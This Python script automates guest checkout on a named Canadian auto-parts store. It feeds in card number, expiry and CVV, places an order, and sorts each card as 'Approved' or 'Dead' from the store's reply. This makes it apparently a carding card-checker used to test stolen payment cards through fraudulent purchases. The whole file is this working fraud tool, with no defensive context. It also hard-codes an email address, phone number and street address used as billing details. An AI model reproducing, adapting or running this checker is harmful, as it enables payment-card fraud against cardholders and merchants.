from utilsdf.functions import capture
from httpx import AsyncClient


async def sebas(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:


        r = await session.get(
            "https://www.autoeq.ca/husky-weatherbeater-tundra",
        )
        t = r.text
        fkey = capture(t, '"form_key" type="hidden" value="', '"')
        url = capture(t, '<div class="product-essential">\n<form action="', '"')

        h2 = {
            "Host": "www.autoeq.ca",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "x-prototype-version": "1.7",
            "origin": "https://www.autoeq.ca",
            "referer": "https://www.autoeq.ca/husky-weatherbeater-tundra",
        }

        p2 = f"form_key={fkey}&product=21024&related_product=&super_attribute%5B295%5D=1634&super_attribute%5B296%5D=1404&super_attribute%5B297%5D=1467&super_attribute%5B298%5D=1384&qty=1&return_url=&isAjax=true"

        r2 = await session.post(
            url,
            headers=h2,
            data=p2,
        )

        r3 = await session.get(
            "https://www.autoeq.ca/checkout/onepage/",
        )
        t3 = r3.text
        q = capture(t3, '"quote_id" value="', '"')

        h4 = {
            "Host": "www.autoeq.ca",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "x-prototype-version": "1.7",
            "origin": "https://www.autoeq.ca",
            "referer": "https://www.autoeq.ca/checkout/onepage/",
        }

        p4 = f"email=sachiopremiun%40gmail.com&form_key={fkey}&isAjax=True"

        r4 = await session.post(
            "https://www.autoeq.ca/pixonepagecheckout/onepage/verifyCustomerEmail",
            headers=h4,
            data=p4,
        )

        p5 = "method=guest"

        r5 = await session.post(
            "https://www.autoeq.ca/checkout/onepage/saveMethod/",
            headers=h4,
            data=p5,
        )

        h6 = {
            "Host": "www.autoeq.ca",
            "accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "x-prototype-version": "1.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.autoeq.ca",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://www.autoeq.ca/checkout/onepage/",
        }

        p6 = f"billing%5Baddress_id%5D=&billing%5Bcompany%5D=YT&billing%5Bfirstname%5D=yt&billing%5Blastname%5D=Sachio&billing%5Bemail%5D=sachiopremiun%40gmail.com&billing%5Btelephone%5D=19059495353&billing%5Bcustomer_password%5D=&billing%5Bconfirm_password%5D=&billing%5Bstreet%5D%5B%5D=3168%20Hurontario&billing%5Bstreet%5D%5B%5D=&billing%5Bcity%5D=Mississauga&billing%5Bregion_id%5D=74&billing%5Bregion%5D=&billing%5Bpostcode%5D=L5B%201N9&billing%5Bcountry_id%5D=CA&billing%5Bzoey_shipping_type%5D=1&billing%5Bsave_in_address_book%5D=1&billing%5Buse_for_shipping%5D=1&quote_id={q}"

        r6 = await session.post(
            "https://www.autoeq.ca/checkout/onepage/saveBilling/",
            headers=h6,
            data=p6,
        )

        p7 = f"shipping_method=tablerate_bestway&zoeyOrderEavAttributes%5Bhow_did_you_find_us_%5D=3789&zoeyOrderEavAttributes%5Bquestion%5D=&form_key={fkey}&quote_id={q}&isAjax=1"

        r7 = await session.post(
            "https://www.autoeq.ca/checkout/onepage/saveShippingMethod/",
            headers=h6,
            data=p7,
        )

        if cc.startswith("3"):
            typec = "AE"
        elif cc.startswith("4"):
            typec = "VI"
        elif cc.startswith("5"):
            typec = "MC"
        elif cc.startswith("6"):
            typec = "DI"

        p8 = f"payment%5Bmethod%5D=paypal_direct&payment%5Bcc_number%5D={cc}&payment%5Bcc_type%5D={typec}&payment%5Bcc_exp_month%5D={month}&payment%5Bcc_exp_year%5D={year}&payment%5Bcc_cid%5D={cvv}&quote_id={q}"

        r8 = await session.post(
            "https://www.autoeq.ca/checkout/onepage/savePayment/",
            headers=h6,
            data=p8,
        )

        r9 = await session.post(
            "https://www.autoeq.ca/checkout/onepage/saveOrder/",
            headers=h6,
            data=p8,
        )
        t9 = r9.text
        tr = capture(t9, '"success":', ",")
        msg = capture(t9, '"error_messages":"', '"')

        if msg == None:
            msg = "error"

        if tr == "success":
            status = "Approved! ✅"
            msg = "Success -» CA$143.95"
        elif "Please enter a valid Credit Card Verification Number" in msg:
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
